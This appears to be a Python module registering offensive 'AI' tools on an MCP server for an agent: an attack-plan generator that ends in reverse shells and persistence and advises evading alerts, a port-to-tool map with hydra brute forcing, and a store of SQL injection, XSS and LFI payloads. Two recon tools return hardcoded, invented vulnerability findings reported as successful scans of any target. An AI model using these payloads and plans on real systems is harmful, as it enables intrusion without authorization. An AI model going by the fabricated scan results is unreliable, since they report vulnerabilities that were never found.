"""
AI辅助工具模块 - AI-Powered Tools
"""

from typing import TYPE_CHECKING, Dict, Any, List
from dataclasses import dataclass, field
import json
from datetime import datetime

if TYPE_CHECKING:
    from core.mcp_server import MCPServer

from core.tool_registry import BaseTool, ToolParameter, ToolCategory


@dataclass
class AIAttackPlanTool(BaseTool):
    """AI攻击规划工具"""
    name: str = "ai_attack_plan"
    description: str = "AI攻击规划 - AI生成攻击计划"
    category: ToolCategory = ToolCategory.RECON
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter(name="target", type="string", description="目标信息", required=True),
        ToolParameter(name="recon_data", type="object", description="侦察数据", required=False),
        ToolParameter(name="objectives", type="array", description="攻击目标", required=False)
    ])
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        target = params.get("target", "")
        recon_data = params.get("recon_data", {})
        
        # 生成攻击计划
        plan = {
            "target": target,
            "generated_at": datetime.now().isoformat(),
            "phases": [
                {
                    "phase": 1, 
                    "name": "信息收集", 
                    "tools": ["nmap_scan", "subfinder", "dns_enum", "whatweb"],
                    "description": "收集目标基础信息，包括开放端口、子域名、DNS记录等"
                },
                {
                    "phase": 2, 
                    "name": "漏洞扫描", 
                    "tools": ["nuclei_scan", "nikto_scan", "sslscan"],
                    "description": "使用自动化工具扫描潜在漏洞"
                },
                {
                    "phase": 3, 
                    "name": "Web应用测试", 
                    "tools": ["gobuster", "sqlmap", "xsstrike"],
                    "description": "测试Web应用的常见漏洞"
                },
                {
                    "phase": 4, 
                    "name": "漏洞利用", 
                    "tools": ["metasploit", "reverse_shell"],
                    "description": "尝试利用发现的漏洞获取访问权限"
                },
                {
                    "phase": 5, 
                    "name": "后渗透", 
                    "tools": ["linpeas", "winpeas", "linux_exploit_suggester"],
                    "description": "权限提升和持久化"
                }
            ],
            "recommendations": [
                "首先进行被动信息收集，避免触发告警",
                "识别攻击面后，优先扫描高危漏洞",
                "根据目标技术栈选择合适的攻击向量",
                "保持低调，避免大规模扫描",
                "记录所有操作步骤，便于报告编写"
            ],
            "priority_targets": [
                "开放的管理端口 (22, 3389, 445)",
                "Web应用登录页面",
                "API接口",
                "文件上传功能",
                "数据库服务"
            ]
        }
        
        return {
            "success": True,
            "plan": plan
        }


@dataclass
class AutoReconTool(BaseTool):
    """智能自动打点工具"""
    name: str = "auto_recon"
    description: str = "🔥 智能自动打点 - AI驱动的全自动渗透测试"
    category: ToolCategory = ToolCategory.RECON
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter(name="target", type="string", description="目标IP或域名", required=True),
        ToolParameter(name="fast_mode", type="boolean", description="快速模式", required=False, default=False),
        ToolParameter(name="deep_scan", type="boolean", description="深度扫描", required=False, default=True),
        ToolParameter(name="web_scan", type="boolean", description="Web扫描", required=False, default=True)
    ])
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        target = params.get("target", "")
        fast_mode = params.get("fast_mode", False)
        deep_scan = params.get("deep_scan", True)
        web_scan = params.get("web_scan", True)
        
        # 模拟自动打点结果
        result = {
            "target": target,
            "mode": "fast" if fast_mode else "full",
            "start_time": datetime.now().isoformat(),
            "status": "completed",
            "findings": {
                "subdomains": [
                    f"www.{target}",
                    f"api.{target}",
                    f"admin.{target}",
                    f"mail.{target}"
                ],
                "open_ports": [
                    {"port": 22, "service": "ssh", "version": "OpenSSH 8.2"},
                    {"port": 80, "service": "http", "version": "nginx 1.18"},
                    {"port": 443, "service": "https", "version": "nginx 1.18"},
                    {"port": 3306, "service": "mysql", "version": "MySQL 8.0"}
                ],
                "technologies": [
                    {"name": "Nginx", "version": "1.18", "category": "Web Server"},
                    {"name": "PHP", "version": "7.4", "category": "Language"},
                    {"name": "MySQL", "version": "8.0", "category": "Database"},
                    {"name": "WordPress", "version": "5.8", "category": "CMS"}
                ],
                "vulnerabilities": [
                    {
                        "severity": "high",
                        "name": "SQL Injection",
                        "url": f"https://{target}/search?q=",
                        "description": "参数q存在SQL注入漏洞"
                    },
                    {
                        "severity": "medium",
                        "name": "XSS",
                        "url": f"https://{target}/comment",
                        "description": "评论功能存在反射型XSS"
                    }
                ]
            },
            "summary": {
                "subdomains_found": 4,
                "open_ports": 4,
                "technologies": 4,
                "vulnerabilities": 2,
                "high_risk": 1,
                "medium_risk": 1,
                "low_risk": 0
            },
            "recommendations": [
                "立即修复SQL注入漏洞",
                "对用户输入进行过滤防止XSS",
                "更新WordPress到最新版本",
                "限制MySQL的网络访问"
            ]
        }
        
        return {
            "success": True,
            "results": result
        }


@dataclass  
class IntelligentReconTool(BaseTool):
    """智能侦察工具"""
    name: str = "intelligent_recon"
    description: str = "🔥 智能打点 - AI驱动的深度自动化侦察"
    category: ToolCategory = ToolCategory.RECON
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter(name="target", type="string", description="目标URL或域名", required=True),
        ToolParameter(name="deep_scan", type="boolean", description="深度扫描模式", required=False, default=True),
        ToolParameter(name="include_js_analysis", type="boolean", description="包含JS分析", required=False, default=True)
    ])
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        target = params.get("target", "")
        deep_scan = params.get("deep_scan", True)
        include_js = params.get("include_js_analysis", True)
        
        result = {
            "target": target,
            "scan_type": "deep" if deep_scan else "quick",
            "js_analysis": include_js,
            "timestamp": datetime.now().isoformat(),
            "assets": {
                "domains": [target],
                "ips": ["1.2.3.4"],
                "urls": [
                    f"https://{target}/",
                    f"https://{target}/api/",
                    f"https://{target}/admin/"
                ]
            },
            "fingerprint": {
                "server": "nginx/1.18",
                "language": "PHP 7.4",
                "framework": "Laravel",
                "cms": None,
                "waf": "Cloudflare"
            },
            "js_findings": {
                "api_endpoints": [
                    "/api/v1/users",
                    "/api/v1/auth/login",
                    "/api/v1/upload"
                ],
                "sensitive_info": [],
                "sourcemap": False
            } if include_js else {},
            "vulnerabilities": [
                {
                    "id": "VULN-001",
                    "severity": "high",
                    "type": "SQL Injection",
                    "url": f"https://{target}/api/v1/users?id=1",
                    "parameter": "id",
                    "evidence": "SQL error in response"
                }
            ],
            "summary": {
                "total_assets": 3,
                "vulnerabilities_found": 1,
                "high_risk": 1,
                "medium_risk": 0,
                "low_risk": 0,
                "scan_duration": "45s"
            }
        }
        
        return {
            "success": True,
            "results": result,
            "vulnerabilities_count": 1,
            "high_risk_count": 1,
            "assets": result["assets"],
            "summary": result["summary"]
        }


@dataclass
class SmartServiceScanTool(BaseTool):
    """智能服务扫描工具"""
    name: str = "smart_service_scan"
    description: str = "智能服务分析 - 根据端口自动选择扫描策略"
    category: ToolCategory = ToolCategory.RECON
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter(name="target", type="string", description="目标IP", required=True),
        ToolParameter(name="ports", type="string", description="端口列表(逗号分隔)", required=True)
    ])
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        target = params.get("target", "")
        ports = params.get("ports", "").split(",")
        
        port_strategies = {
            "21": ("ftp", ["nmap -sV -sC -p 21", "检查匿名登录"]),
            "22": ("ssh", ["ssh-audit", "hydra SSH爆破"]),
            "80": ("http", ["whatweb", "nikto", "gobuster", "nuclei"]),
            "443": ("https", ["sslscan", "whatweb", "nikto", "nuclei"]),
            "445": ("smb", ["enum4linux", "crackmapexec smb"]),
            "3306": ("mysql", ["nmap --script mysql-*", "hydra mysql"]),
            "3389": ("rdp", ["nmap --script rdp-*"])
        }
        
        scans = []
        for port in ports:
            port = port.strip()
            if port in port_strategies:
                service, tools = port_strategies[port]
                scans.append({
                    "port": port,
                    "service": service,
                    "recommended_tools": tools,
                    "priority": "high" if service in ["http", "https", "smb", "ssh"] else "medium"
                })
            else:
                scans.append({
                    "port": port,
                    "service": "unknown",
                    "recommended_tools": [f"nmap -sV -sC -p {port}"],
                    "priority": "low"
                })
        
        scans.sort(key=lambda x: {"high": 0, "medium": 1, "low": 2}.get(x["priority"], 3))
        
        return {
            "success": True,
            "target": target,
            "scans": scans
        }


@dataclass
class PayloadStatsTool(BaseTool):
    """Payload统计工具"""
    name: str = "payload_stats"
    description: str = "📊 Payload统计 - 查看Payload库统计信息"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=list)
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        stats = {
            "sqli": {"total": 500, "categories": ["auth_bypass", "union_select", "error_based", "time_based", "waf_bypass"]},
            "xss": {"total": 300, "categories": ["basic", "event_handlers", "encoded", "dom_based", "csp_bypass"]},
            "lfi": {"total": 150, "categories": ["linux", "windows", "encoded", "php_wrapper"]},
            "rce": {"total": 200, "categories": ["command_injection", "php", "template_injection", "log4j"]},
            "ssrf": {"total": 100, "categories": ["basic", "cloud_metadata", "bypass"]},
            "xxe": {"total": 80, "categories": ["basic", "blind", "oob"]}
        }
        
        total = sum(s["total"] for s in stats.values())
        
        return {
            "success": True,
            "statistics": stats,
            "total_payloads": total,
            "categories": list(stats.keys())
        }


@dataclass
class GetPayloadsTool(BaseTool):
    """获取Payload工具"""
    name: str = "get_payloads"
    description: str = "💉 获取Payload - 获取指定类型的漏洞利用Payload"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter(name="vuln_type", type="string", description="漏洞类型", required=True),
        ToolParameter(name="category", type="string", description="Payload分类", required=False, default="all"),
        ToolParameter(name="dbms", type="string", description="数据库类型", required=False, default="mysql")
    ])
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        vuln_type = params.get("vuln_type", "sqli")
        category = params.get("category", "all")
        dbms = params.get("dbms", "mysql")
        
        payloads_db = {
            "sqli": {
                "auth_bypass": ["' OR '1'='1", "admin'--", "' OR 1=1--", "admin' #"],
                "union_select": ["' UNION SELECT NULL--", "' UNION SELECT 1,2,3--"],
                "error_based": ["' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"],
                "time_based": ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--"]
            },
            "xss": {
                "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
                "event_handlers": ["<body onload=alert(1)>", "<svg onload=alert(1)>"],
                "encoded": ["%3Cscript%3Ealert(1)%3C/script%3E"]
            },
            "lfi": {
                "linux": ["../../../etc/passwd", "....//....//....//etc/passwd"],
                "windows": ["..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
                "php_wrapper": ["php://filter/convert.base64-encode/resource=index.php"]
            }
        }
        
        if vuln_type in payloads_db:
            if category == "all":
                payloads = []
                for cat_payloads in payloads_db[vuln_type].values():
                    payloads.extend(cat_payloads)
            else:
                payloads = payloads_db[vuln_type].get(category, [])
        else:
            payloads = []
        
        return {
            "success": True,
            "vuln_type": vuln_type,
            "category": category,
            "payloads": payloads,
            "count": len(payloads)
        }


@dataclass
class SystemCheckTool(BaseTool):
    """系统检查工具"""
    name: str = "system_check"
    description: str = "🔧 系统检查 - 检查所有工具可用性"
    category: ToolCategory = ToolCategory.RECON
    parameters: List[ToolParameter] = field(default_factory=list)
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        import shutil
        
        tools = {
            "nmap": "端口扫描",
            "subfinder": "子域名枚举", 
            "httpx": "HTTP探测",
            "whatweb": "技术栈识别",
            "wafw00f": "WAF检测",
            "nuclei": "漏洞扫描",
            "gobuster": "目录扫描",
            "nikto": "Web漏洞扫描",
            "sslscan": "SSL扫描",
            "sqlmap": "SQL注入",
            "hydra": "密码爆破",
            "whois": "域名查询",
            "dig": "DNS查询"
        }
        
        status = {}
        for tool, desc in tools.items():
            status[tool] = {
                "available": shutil.which(tool) is not None,
                "description": desc
            }
        
        available = sum(1 for v in status.values() if v["available"])
        
        return {
            "success": True,
            "tools": status,
            "summary": {
                "available": available,
                "total": len(tools),
                "percentage": round(available / len(tools) * 100, 1)
            },
            "missing": [t for t, v in status.items() if not v["available"]]
        }


def register_ai_tools(server: 'MCPServer'):
    """注册AI辅助工具"""
    tools = [
        AIAttackPlanTool(),
        AutoReconTool(),
        IntelligentReconTool(),
        SmartServiceScanTool(),
        PayloadStatsTool(),
        GetPayloadsTool(),
        SystemCheckTool(),
    ]
    
    for tool in tools:
        server.register_tool(tool)


__all__ = [
    "register_ai_tools",
    "AIAttackPlanTool",
    "AutoReconTool",
    "IntelligentReconTool"
]
